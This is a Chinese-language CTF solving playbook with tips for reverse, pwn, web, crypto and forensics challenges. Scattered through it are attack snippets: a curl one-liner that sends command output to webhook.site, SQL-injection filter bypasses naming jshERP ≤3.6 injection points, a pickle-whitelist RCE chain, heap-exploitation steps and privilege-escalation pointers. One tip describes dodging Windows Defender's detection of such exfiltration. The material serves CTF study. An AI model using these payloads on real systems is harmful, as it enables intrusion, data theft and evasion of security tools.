## 1. 通用思维模式（所有题型先想这些）

| # | 思维模式 | 具体怎么做（含实测锚点） |
|---|---|---|
| 1 | **"谁消费了输入"优先** | 攻击面不在输入本身，而在"谁在之后处理它"。先画数据流：输入→处理者→输出。上传后若有查看器/解析器 → 文件本身是攻击载体（SVG=XML→XXE）；只静态托管 → 文件内容无法执行，另找路（如 LFI） |
| 2 | **区分校验层次** | 扩展名白名单 ≠ 内容校验。只查扩展名 → 找白名单内"可被服务端解析"的格式（SVG/XML/图片元数据）；查内容（`getimagesize`）→ 做 polyglot 或放弃该路 |
| 3 | **分阶段原语化**（尤其 Pwn） | 把目标拆成"泄露→控制→劫持→触发"四个原语，每个原语找对应漏洞点，串成链；先本地复现（Kali gdb）再打远程 |
| 4 | **数据特征→编码家族**（Misc） | 字符集定编码：base64 `A-Za-z0-9+/`、base32 `A-Z2-7`、hex 仅 `0-9a-f`；结构定组织方式（层级=递归/顺序，可逆变换=试正/反序）。**诱饵 flag 失败 → 换数据源**（文件名/注释/时间戳/描述），别死磕提交次数 |
| 5 | **验证驱动** | 任何假设先用最小样本验证（上传 1×1 图片、单字节 payload、一次请求），确认成立再规模化；远程序列化交互先验证"换行残留/长度"再批量 |
| 6 | **排除假象** | SPA 兜底会令所有路径返回首页——`www.zip`/`.git` 返回 200 **不等于**真泄露，看 Content-Type 和 body 是不是真文件 |
| 7 | **跨字段拼接要管全宽度** | 对象里"函数指针/地址"可能是 8 字节，却被相邻两个 4 字节字段覆盖：低 4 字节来自字段 A、**高 4 字节来自字段 B**。改指针必须同时控制 B（常须置 0），否则拼出 `0x00000001_xxxx` 之类非法地址崩溃。反汇编看到 `mov [x+0x20], edx`（4 字节写）而消费方 `call [x+0x20]`（8 字节读）就是此坑；本地 gdb 断在 call 处打印 `CALL TARGET` 一眼定位 |
| 8 | **大循环/递归先找闭式** | `decode_e` 对每个 i 算 `(i-1)! mod i`（O(7 亿) 不可跑）→ 逐项性质 = Wilson 定理（素数 i → -1）+ 少量异常项 → 闭式 `-π(E)+2`，用 `sympy.primepi` 秒算。凡"对每个数做可化简运算"的函数，先数学化简；识别已知定理模式（Wilson/Fermat/Euler/CRT…） |
| 9 | **相邻素数 = Fermat 分解** | `p = next_prime(q)` → p-q 极小 → `a=ceil(√n), a²-n=b²` 几步出解（实测 p-q=210，**0 迭代**）。看到 next_prime/相近素数结构直接 Fermat，不要上 Pollard rho |
| 10 | **无回显 RCE 用外带** | 响应恒为固定串时：`(cmd) \| curl -s -X POST --data-binary @- https://webhook.site/<uuid>`；webhook.site 免注册即用，**先发 `probe` 确认出网**再发大命令；命令用 `sh -c` 包裹以支持管道 |
| 11 | **被删文件从 `/proc/<pid>/fd` 恢复** | start.sh `rm` 掉 jar 但 JVM 仍持有 → `ls -la /proc/<pid>/fd \| grep deleted` → `cat /proc/<pid>/fd/N > 恢复文件`。文件系统找不到目标时查"谁还开着它" |
| 12 | **内容搜索 > 文件名搜索** | `find / -iname '*flag*'` 找不到时，flag 文件可能不叫 flag → `grep -r -l 'DASCTF' /`（排除 `/proc` `/sys`）。**部署版附件可能被平台 patch**（本地附件是诱饵/占位，靶机里才是真值）→ 拿 flag 前在靶机侧核实 |
| 13 | **gadget/工具兼容性** | ysoserial 默认 payload 在靶机反序列化可能 500（JDK/依赖版本差异）→ 用**从靶机 jar 提取的同款依赖**（如 `commons-collections-3.1.jar`）自编 gadget 生成器，本地编译即可，输出 base64 直发 |
| 14 | **Java 反序列化快速定位** | jar 里搜 `readObject`/`ObjectInputStream`（strings 即见）；看依赖里有无 commons-collections/beanutils 等 gadget 库；`javap -c` 反汇编确认 sink；附件 jar 先列 `BOOT-INF/lib/*` 找线索 |
| 15 | **参数敏感性矩阵**（交互/判定题第一步） | 拿 3 个差异极大的参数各打一次，比较**回显是否变化**。若回显与参数完全无关（极氪 397：`0x21` 喂了约 5900 组参数与序列，回显恒为 `02 74 6c 76`）⇒ 得到本题最强事实：**门不是靠参数开的** → 立刻停枚举，转向调用次数/顺序/时序驻留/帧长/另一条入口。**"回显对输入不敏感"是结论，不是噪声** |
| 16 | **"记录里混诱饵"用密码学链式绑定筛真伪** | 判据要依赖**全局状态/全量数据**（如整张镜像），对每个序号把**全部**候选都跑一遍，**唯一通过者**为真——不要按顺序取第一个像样的、更不能用位置/顺序/格式合法性筛 |
| 17 | **矛盾即信号** | 两次结果不一致、oracle 自相矛盾（如"真"响应 >96 而"假"响应 >1）→ 立刻停手查工具/链路本身，不要继续加假设族 |

## 2. Reverse

| 手法 | 要点 |
|---|---|
| 打底三件套 | 先 `file`/checksec/字符串/导入表，**画数据流**；**不相信"看起来像"** |
| 自建干净反汇编 | 需要干净反汇编时自己写 capstone/objdump 脚本落盘成 `dis.txt`（带字符串注解）——比在 GUI 里翻更快、可 grep、可喂给 AI 读 |
| 动态 + 约束求解 | IDA Pro MCP 反编译 ＋ z3 解约束 ＋ 动态调试（Kali gdb） |
| 泄漏点 | 找 PIE/栈/libc 泄漏点：打印、越界读、未初始化 |
| 后门常客 | 二进制里**没有被任何代码引用**的函数/常量常常就是干净的后门（长城杯 `0x2ae0` 是未被引用的 `fopen("/flag")`）。搜法：xref 为空的函数、只被数据引用的地址、`.rodata` 里没被引用的常量块 → 详见 `99` 第 3 条 |
| 大循环/递归 | 先闭式化 → §1·8 |
| 相邻素数结构 | 直接 Fermat → §1·9 |
| **Android 先按 DEX 体积排序** | 最小的 DEX 往往就是出题人的类（数信杯 497：`classes.dex` 9.8 MB 全是框架，`classes3.dex` 仅 4632 B 装 `MainActivity`）；本地校验+本地解密型题目**不必跑 App**，拿常量离线爆破输入空间 |
| **密钥派生认准"哪个串"** | 校验用加盐串、解密用纯输入摘要（497：`MD5("41.65")` 当 AES key、`MD5("41.65"+SALT)` 当校验）；同一题两个派生别混 |
| **固件包结构断言** | `magic + TLV(型号/版本/算法) + IV + SHA-256(明文) + header CRC32 + 签名尾(SIG0/DER)`；工具可能是**stdin 帧协议**（`u32 nameLen;name;u64 size;{u32 len;chunk}*;u32 0`）而非文件 CLI（232） |
| **签名校验绕过 = patch 一条跳转** | 题作者重打包 payload ⇒ 签名必失败，别硬碰；`文件偏移 = VA − 0x400000`（PIE 静态基址），`0f 85 …`(jne) → `90×6`（232） |
| **常量必须用作者代码对拍** | 手把十进制常量转 hex 会错（232 曾写成 `0x7FE5A0ED`，正确 `0x7FEB352D`）⇒ 用 JVM 反射/原工具/原 APK 跑一遍当硬断言 |
| **LLL 解低密度背包** | n=64 / 160 bit、d=0.4 秒解；格基 `[[2I\|2W],[1…1\|2S]]`；**`[2z_i+1,0]` 里 bit=1 对应坐标 −1**，必须用"权重和==S"独立校验否则拿到伪解；密钥派生常接 `SHA-256("BOTPACK-V2\0"‖bitmap)` + ChaCha20（238） |
| **多线索拼接题** | 每条线索独立复算（作者 class 解密字段、Digest response RFC2617、被抹 u32 使 **32 位大端字和=0xFFFFFFFF**），最后 `SHA-256(F1+F2+F3)` 当对称密钥（232） |

## 3. Pwn

| 手法 | 要点 |
|---|---|
| 开局 | 先 `ELF()` 看 arch/保护（PIE/NX/Canary/RELRO），**libc 版本定手法**（safe-linking 有无） |
| 四原语链 | 泄露：unsorted/smallbin fd（`%s`/`%lld` 打印 freed chunk）、tcache fd（堆地址）→ 控制：UAF edit freed chunk 的 fd（tcache 投毒）、2 字节溢出改下一块 size（隔离 bin、制造 overlap）、double-free 造重叠 → 劫持：`__free_hook=system`（glibc<2.34）或 FSOP/`malloc_hook` → 触发：`free("/bin/sh")`、改函数指针后调用 |
| 栈 | 溢出/格式化串 → ret2libc/ROP（**有 libc 附件先算偏移**） |
| 本地先行 | 复杂链先本地 Kali 复现（系统 libc 验证布局/偏移），再对远程微调 |
| **没 gadget 就换原语** | 长城杯：libc 可执行段没有 `pop rdx` → 改用 `__setcontext`，从 `+0x20` 进入伪造 ucontext 恢复 rdi/rsi/rdx/rsp/rip |
| **calloc 绕过 tcache** | `__libc_calloc → _int_malloc`，不走 `__libc_malloc` 的 tcache 快速取用 → 某个 size 的 tcache bin 可以被填满，从而把 free 逼进 unsorted/consolidate 路径（unsafe unlink 的前置条件） |
| **寄存器是"借来的"** | ROP 里任何**没被你显式设置**的寄存器都是**上一个调用留下的值**；用之前先打印/自证一次 |
| 读 `/flag` 最短路径 | 先确认 seccomp 到底放行什么——**解 BPF 逐条读**，别靠"被打死"的体感（`SECCOMP_RET_LOG` 是放行不是 KILL） |
| 靶机 flag 常见位置 | 进程已继承的 fd、`/flag`、`/flag.txt`、env、argv、被删但打开着的文件（`/proc/<pid>/fd`） |
| 载荷长度必须精确 | 程序 read 固定字节（如 `0x98`/`0x9a`），发短了会吃后续输入造成**流错乱**，发长了残留；add/edit 的 payload 长度按反汇编/文档确定 |
| `scanf %d` 换行残留 | `sendline` 的 `\n` 会被 `scanf` 留下，`read()` 会先吃掉它——远程表现因实现而异，先小样本验证偏移再批量 |
| 堆题本地复现细节 | Linux ELF 拷到 Kali/WSL；`LD_PRELOAD` 不可用就用系统 libc 验证布局/偏移；gdb 断点看真实 chunk 地址（**PIE 下用符号断点，不用绝对地址**） |
| 2 字节溢出落点 | edit 溢出写的是下一块 **size 字段低 2 字节**；改 size 要**保留 prev_inuse 位**（`0xa0→0x141` 而非 `0x140`）；改大 size 进 unsorted 时 nextchunk 必须落在真实 chunk 上（否则 `invalid next size` 崩溃） |
| 泄露偏移校准 | `%lld` 打印的地址算 `libc_base` 后必须验证**页对齐**（`&0xFFF==0`），不对就调 bins 偏移（实战：`unsorted_head = __malloc_hook + 0x70`） |
| 跨字段指针拼接 | 8 字节指针被两个 4 字节字段覆盖 → §1·7 |

## 4. Web

| 手法 | 要点 |
|---|---|
| 数据流 | 先画"输入 → 谁消费 → 输出"；**校验层次**决定攻击面（扩展名 ≠ 内容）→ §1·1 §1·2 |
| 源码泄露 | 优先找 `/www.zip`、`*.bak`、`.git`；**SPA 兜底会让所有路径都 200**，必须看 Content-Type 与正文是否真文件 |
| 反序列化（PHP/Java/Py） | 找入口（`unserialize`/`readObject`）→ 读源码找类 → 沿魔术方法（`__wakeup`/`__invoke`/`__call`/`__destruct`）构建触发链 → 注意触发时参数（如 `$func('arg')` 带参仍可调对象） |
| 长度字段失步 | 注意**长度字段与实际内容失步**（过滤器改写内容却没改 length）→ `role=admin` 这类对象注入 |
| 文件上传 | 校验层次见上；允许类型里优先考虑 **SVG（XXE/XSS）**、图片马（需后续包含/解析）；找查看/回显点（如 `view.php?file=`）作为触发入口 |
| 注入家族 | SQLi/SSRF/SSTI/JWT 伪造：参数 fuzz + 响应差异判断 |
| **ORDER BY / IN 的 `${}` 拼接注入** | MyBatis 里 `order by ${column}`、`in (${barCodes})` 是稳定入口（jshERP ≤3.6 两处：`MaterialMapperEx:700`、`DepotItemMapperEx`）。**过滤器只删"与空格相邻"的关键字**时（jshERP `StringUtil.safeSqlParse`），把 `select ` 写成 `(select(1))`、` and ` 写成 `&&` 即绕过；`' # -- % ;` 被吃就用 `0x` 十六进制表达字符串（`/flag`=`0x2f666c6167`）。白盒定位法：拉 GitHub 源码对比版本，**修好的那行就是原来那行** |
| **报错型布尔 oracle** | `where(<COND>)&&(select(1)union(select(2)))`（多行子查询）构造二分：真=业务 500、假=200。**别用 `if((COND),(select…union…),0)`**——优化期就求值常量 → 假阳性。判据只看响应体字段，不看 HTTP 状态码 |
| **SQL 读文件取 flag** | 先验 `isnull((select(load_file(0x2f666c6167))))=0`；`@@secure_file_priv` 为空**不代表**有权限，以 load_file 实测为准。长度二分 + 多线程逐字符 `ASCII(SUBSTRING(...))` 取位（12 线程 39 字节 18 秒）。库内搜不到 flag 时转向**文件系统**（`/flag`、`/tmp/flag`） |
| **过滤器类防护的三类通病** | ①只检查**第一个**同名参数值（HPP 绕过：`?url=合法&url=恶意`，pgsql `socketFactory=ClassPathXmlApplicationContext&socketFactoryArg=file:/tmp/x.xml`）②只按"与空格相邻"删关键字（`(select(1))`/`&&` 绕）③只黑 `GLOBAL` 名字**不黑被调对象** |
| **pickle 白名单绕过** | `find_class` 只放行 builtins 的 `getattr/globals/…` 也能 RCE：`__reduce__=(callable,args)` 的 args 先求值 ⇒ `globals()` → `getattr(d,'__getitem__')('os')` → `getattr(os,'__dict__')['system']` → `system(cmd)`；载体类加 `__call__` 过 `callable()` 检查，流里只出现 `builtins.getattr` + 普通字符串 |
| **字符白名单 + eval** | 先找**规则来源**（`robots.txt` 泄漏 `*.js` 白名单、注释、语法错误回显）；`[]()!+` 四符号即 **JSFuck** 完备集；`eval` 内**不自动 return**，必须写显式 `return`；逃逸不成 → 回资产层找静态令牌文件 / dev server 放行路径 |
| **无参迷你语言** | 只允许 `ident()` 序列的 PHP 后端 = "去掉 `\w+()` 看剩没剩东西" 后 `eval`；裸词返回的 flag 可能是**诱饵**；静态 `*_token` 文件常可直接读 |
| 盲注 oracle 判据 | **判据用响应体内容，不用响应长度**（西湖 MISC-02：真判据是响应体末尾 `success` 标记，长度差只是回显 SQL 位数差异，误用长度白卡 2 小时）；末字符探测全假 = 越界 = 字符串已结束（不补字符） |
| 动态目标必须重扫 | 靶机重启后 `__subclasses__()` 下标会漂移（实测 **132→258**），旧链读错文件、两次外带结果矛盾（pos6 `'['` vs `'g'`）→ RCE 链的动态下标/偏移/glob 结果**每次连接前重扫**，结果矛盾立即查链本身 |
| 拿到 RCE 后 | 先看提权面：`sudo -l`、SUID、cron、可写服务配置、GTFOBins |
| Java 利用链工程化 | ysoserial 在 Java 21 生成 CC payload 需 `--add-opens java.base/...=ALL-UNNAMED`；对靶机反序列化 500 时改用靶机同款依赖 jar 自编生成器 |
| PowerShell 通道坑 | `>` 会把 java stdout 按**文本损坏** → 用 python `subprocess` capture 原始字节；Windows Defender 会把"PS 调 java 生成 CC payload + webhook 外带"判为 Trojan（行为检测）→ 改走 python 通道，勿在 PS 里堆这类命令 |
| 杀软误报 | `ysoserial-all.jar` 本身可能被标记；下载后如被杀就加排除或改用自编生成器；解题工具放工作区前先确认**没被清理** |
| 部署版 ≠ 本地附件 | 本地附件 `FLAG="FAKE_FLAG"` 是诱饵，部署版 jar 同一字段是真 flag 且代码从不返回它 → 只能 RCE 后读 class 文件（见 §1·12） |

## 5. Crypto

| 手法 | 要点 |
|---|---|
| **结构翻译先行** | 题面的数学/代码先翻译成**攻击原语**再写码：共模、低指数、相近素数=Fermat、Wilson、流复用、分组 oracle、格攻击。两个已实战的翻译例：`e=2^16 → gcd(e,φ)=4 → m^4 开两次平方根`；`pow(AES_KEY_ENC, d, q*r) = 泄露 PKCS1 明文块` |
| 库与现成函数 | pycryptodome / gmpy2 / sympy / z3；RSA 系（共模/低指数/Wiener/费马）、流密码复用、分组 oracle、格攻击；`scripts/tools.py` 有现成函数 |
| oracle 题判据 | **先导出已知真/假两条响应做内容对照**，再用它当判据；抽样量要够（"0/N"只有 N 足够大才是证据） |
| **Rabin oracle → 分解 N** | 服务给 `sqrt(x)` 返回**随机**平方根 ⇒ 同 x 取两次，`r1≠±r2` 时 `gcd(r1−r2,N)` 出因子（概率 1/2）；再用 parity/jacobi 在 4 个候选明文里筛唯一（数信杯 246） |
| **p−1 光滑 → Pollard p−1** | `a=2`，对 `q≤B1` 做 `a=a^(q^⌊log_q B1⌋) mod N`，`gcd(a−1,N)=p`。**B1 要够大**（1000/5000 不够、20000 命中）；服务常"打一对新 N/e/c 就静默 EOF"，客户端读超时要设（247） |
| **参数化生成密钥** | Pell（`x²−2y²=1` → `(3+2√2)^k`，由 `N≈x·y` 估 k）、`next_prime(相近素数)` → 先**还原生成过程**再解密（471） |
| **部分密钥泄露 → Coppersmith** | 已知每素数高位，剩 k bit ⇒ 一元 Coppersmith，格含 `N^{m-i}f(x)^i` 与 `x^j f(x)^m`（行乘 `X^i`）。**m,t 必须试**（p: m=4,t=3；q: m=3,t=2）（472） |
| **单轮 SPN：恢复 key 不分解** | `E=L(S(p⊕K1))⊕K2`：用"L 线性"判据逐字节定 K1（固定其余字节遍历 a，只有真 K1 对全部 256 个 a 自洽）；同一批差分里含 L 的基像 ⇒ 拼矩阵、`K2=E(0)⊕L(S(K1))`。求逆要用 **A⁻¹ 的列**当像（469） |
| 可化简运算 | 大循环/递归先闭式化 → §1·8 |
| 相近素数 | 直接 Fermat → §1·9 |
| 哈希/编码口径 | 先用**同赛已判正**的题复算一遍，把口径钉死再推导 → `99` 第 11 条 |

## 6. Misc / 取证 / 应急响应

| 手法 | 要点 |
|---|---|
| 逐字读题面 | 附件名/题名/描述**逐字**读一遍（编号、时间、IP 常是答案的一部分）→ §1·4 |
| pcap | 先列所有会话 → 找"唯一有握手/唯一有异常字段"的那条，别在噪声流里泡着 |
| 隐写/编码 | binwalk / strings / LSB / 流量（sharkmcp）；字符集定编码家族，结构定组织方式 |
| 编码识别细节 | 试正/逆向拼接、看文件头、大小写变体、base 家族互相套 |
| 套娃压缩包 | 递归解压时**收集每层文件名/注释/时间戳**——它们可能是信息载体（实战：文件名序列逆序 = 原始编码顺序） |
| 应急响应题 | 答案通常在一个**具体字段**里（时间、IP、文件名、路由、口令）：先把证据文件（日志/DB/配置/内存）列全，再按题目问什么取什么 |
| 诱饵 flag | 题内给的 flag 提交失败 → 检查是否诱饵（信息可能在文件名/结构/描述里），别死磕提交次数 |
| 多通道/多服务题 | 题面出现"两条/多通道/多服务/两个协议族"→ **先确认平台到底暴露了几个入口/端口**（人类 1 分钟动作）；同端口内找不到第二个协议族时**尽早把该假设降级** → `12` 家族 5 |
| **隐蔽通道：连续量藏 bit** | 4 档字段=2 bit（FHIR `Observation` 血压档位 → nibble → UUIDv4）；频域相位 π 翻转=1 bit/bin（`bit=\|wrap(angle(Fm)−2πB/255)\|>π/2`，行主序 MSB-first）；点阵字=字符格（等差列宽定格宽 + z 分层 = 行）。**识别靠统计筛子**：熵/相关系数/取值域/索引一致性（233/240/241） |
| **碎片/删除恢复用校验定序** | FAT 目录项 `0xE5` + FAT 链清空 ⇒ 全盘扫文本簇 + 按**整文件 CRC32** 枚举排列定序；数据区偏移必须由引导扇区推（算错落进诱饵簇）。判据常来自题目自己的日志（`BOOT.LOG: crc32=…`）（236） |
| **诱饵分离** | 一批点里混了噪声 ⇒ 先找"一致性异常"（三轴非整数索引同步、CRC/sha256 不符）再解读；**先剔诱饵再看图**，否则乱线掩盖真结构（241） |
| **工控协议取证** | MAVLink：自写帧同步器（`0xFD`+`crc_extra` 就地爆破）；"谁是攻击者"看**谁打破基线**（只出现 1 帧却注 `MISSION_ITEM_INT`）；机型在 **MAVLink FTP 归档** `*.BIN.z` 里（`BBX1.MODL`）。SOME/IP、OpenIGTLink 同理：定长记录 + 头长度偏移**必须实测**（58 vs 52 差一点全错）（229/230/241） |
| 取证基线 | 会话/系统原始日志是唯一可信事实基线，先统计再下结论 → `30-local-toolchain.md` |
| 附件型取证题 | **先找已给明文，再谈爆破**：题面常写"还原后以 XXX 开头/固定前缀"→ 它直接给出 key/IV/填充判据；先穷举小空间，再考虑结构推导 → `theory-race-ops\refs\04` |
| 掩码/长度是弱约束 | 题面里的掩码位数、字符数**不是**答案长度的证据（实测：平台掩码 13 位、真答案 12 位）→ 只用它筛结构，不用它判长度 |
| 多层分片编码 | base64/编码被切成多段时**先按分片顺序拼接再解码**（顺序常藏在文件名序号/时间戳里），别逐段解码后再拼 |
| 反混淆公式不符实测 | 自己推的 XOR/变换公式与实测明文对不上 → 立刻改用**穷举映射表**（输出空间小就全枚举），别在错公式上继续加假设 |
| 缺密钥/缺盐值 | 判据先做**漏报分析**（PKCS#7 合法性 vs "整块全可打印"：后者会把带填充的正确明文判死）；小空间穷举完仍 0 命中 → 判定"出题漏给信息"，如实交付、不编答案 |
